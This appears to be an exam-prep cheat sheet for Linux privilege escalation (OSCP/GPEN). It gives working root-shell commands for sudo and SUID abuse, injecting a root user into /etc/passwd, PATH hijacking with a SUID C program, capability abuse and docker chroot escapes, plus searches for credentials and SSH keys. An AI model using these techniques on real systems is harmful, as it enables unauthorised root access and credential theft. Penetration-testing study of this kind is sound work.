# Linux Privilege Escalation Cheat Sheet (OSCP / GPEN)

This cheat sheet focuses on **systematic enumeration and exploitation paths** for Linux privilege escalation commonly encountered in **OSCP and GPEN exams**.

Core methodology:

```
Enumerate → Identify Weakness → Exploit → Maintain Access
```

Privilege escalation is **mostly enumeration**. Carefully inspect the system before attempting exploitation.

---

# 1. Basic System Enumeration

First commands to run:

```
hostname
uname -a
cat /proc/version
cat /etc/issue
ps -A
ps axjf
env
sudo -l
id
history
ifconfig
netstat -ano
```

## Current User

```bash
whoami
id
groups
```

Important groups to watch:

```
sudo
docker
lxd
adm
disk
```

---

## System Information

```bash
uname -a
cat /etc/os-release
hostname
cat /proc/version
cat /etc/issue
```

Kernel version:

```bash
uname -r
```

Search for kernel exploits:

```bash
searchsploit linux kernel <version>
```

---

# 2. Sudo Privileges

Check allowed commands:

```bash
sudo -l
```

Example output:

```
(ALL) NOPASSWD: /usr/bin/find
```

Check **GTFOBins**:

https://gtfobins.github.io/

Example exploit:

```bash
sudo find . -exec /bin/sh \; -quit
```

---

# 3. SUID Binaries

Search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

Common exploitable binaries:

```
find
vim
less
awk
perl
python
bash
nmap
```

Example:

```bash
find . -exec /bin/sh \; -quit
```

---

# 4. Writable Files

Find writable files:

```bash
find / -writable -type f 2>/dev/null
```

Writable directories:

```bash
find / -writable -type d 2>/dev/null
```

Important locations:

```
/tmp
/dev/shm
/var/tmp
/opt
/var/www
```

---

# 5. Sensitive Files

Check permissions:

```bash
ls -l /etc/passwd
ls -l /etc/shadow
```

If `/etc/passwd` is writable:

Generate password hash:

```bash
openssl passwd password
```

Add root user:

```
hacker:$1$hash:0:0:root:/root:/bin/bash
```

Switch user:

```bash
su hacker
```

---

# 6. Cron Jobs

Check cron tasks:

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron*
```

Look for scripts executed as root.

Check if writable:

```bash
ls -la /path/script.sh
```

---

# 7. PATH Variable Exploitation

Be sure you can answer the questions below before trying this:
```
What folders are located under $PATH
Does your current user have write privileges for any of these folders?
Can you modify $PATH?
Is there a script/application you can start that will be affected by this vulnerability?
```
Check PATH:

```bash
echo $PATH
```

If script calls commands without absolute path:

Example vulnerable script:

```
backup.sh → tar
```

Create malicious binary:

```bash
echo "/bin/bash" > tar
chmod +x tar
```

Modify PATH:

```bash
export PATH=/tmp:$PATH
```
Find writable folders
```
find / -writable 2>/dev/null
```

Go there (for example, /tmp) and create this:

```
#include <unistd.h>

void _init() {
    setgid(0);
    setuid(0);
    system("thm");
}
```

Compile this into an executable and set the SUID bit.

```
gcc path_exp.c -o path -w
chmod u+s path
ls -la
```

Once executed, “path” will look for an executable named “thm” inside folders listed under PATH.

```
cd /tmp
export PATH=/tmp:$PATH
echo "/bin/bash" > thm
chmod 777 thm
./path
```

---

# 8. Running Processes

Check running processes:

```bash
ps aux
```

Look for:

```
custom scripts
root services
cron jobs
```

---

# 9. System Services

List services:

```bash
systemctl list-units --type=service
```

Check service configuration files.

Look for writable service scripts.

---

# 10. Linux Capabilities

Check capabilities:

```bash
getcap -r / 2>/dev/null
```

Example:

```
/usr/bin/python = cap_setuid+ep
```

Exploit:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

# 11. Writable Service Files

Check systemd services:

```bash
ls -la /etc/systemd/system/
```

If writable, modify service command.

Restart service to gain root shell.

---

# 12. Docker Privilege Escalation

Check group membership:

```bash
groups
```

If user belongs to `docker` group:

```bash
docker run -it -v /:/mnt alpine chroot /mnt /bin/sh
```

---

# 13. LXD Privilege Escalation

Check group:

```bash
groups
```

If user belongs to `lxd` group, containers can mount host filesystem.

---

# 14. NFS Misconfiguration

Check exports:

```bash
showmount -e TARGET
```

If writable share exists:

Mount share and upload SUID binary.

---

# 15. Environment Variables

Check environment:

```bash
env
```

Look for credentials or sensitive information.

---

# 16. Credential Search

Search for passwords in configuration files:

```bash
grep -R "password" /etc 2>/dev/null
grep -R "password" /var/www 2>/dev/null
```

---

# 17. SSH Keys

Check SSH directories:

```bash
ls -la ~/.ssh
```

Look for:

```
id_rsa
authorized_keys
```

---

# 18. Kernel Exploits

Check kernel version:

```bash
uname -r
```

Search exploit database:

```bash
searchsploit linux kernel <version>
```

Examples:

```
Dirty COW
OverlayFS
PwnKit
```

---

# 19. Automated Enumeration Tools

Common tools:

```
linpeas https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
linux-smart-enumeration https://github.com/diego-treitos/linux-smart-enumeration
LinEnum https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester) https://github.com/mzet-/linux-exploit-suggester
Linux PrivChecker https://github.com/linted/linuxprivchecker
```

Run example:

```bash
./linpeas.sh
```

---

# 20. Quick Enumeration Commands

Run these immediately after gaining shell:

```bash
whoami
id
uname -a
sudo -l
cat /etc/crontab
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
ls -la /home
```

---

# 21. Important Locations to Inspect

```
/home
/tmp
/var/tmp
/dev/shm
/opt
/var/www
```

---

# 22. Enumeration Questions

Always ask:

```
What runs as root?
What can I modify?
What executes automatically?
```

---

# 23. OSCP Privilege Escalation Workflow

```
1. Check sudo privileges
2. Check SUID binaries
3. Check cron jobs
4. Check writable files
5. Check capabilities
6. Check kernel exploits
7. Check services
8. Check credentials
```

---

# 24. Final Advice

Privilege escalation is **80% enumeration**.

Remember:

```
The system will usually tell you how to become root.
You just need to read carefully.
```
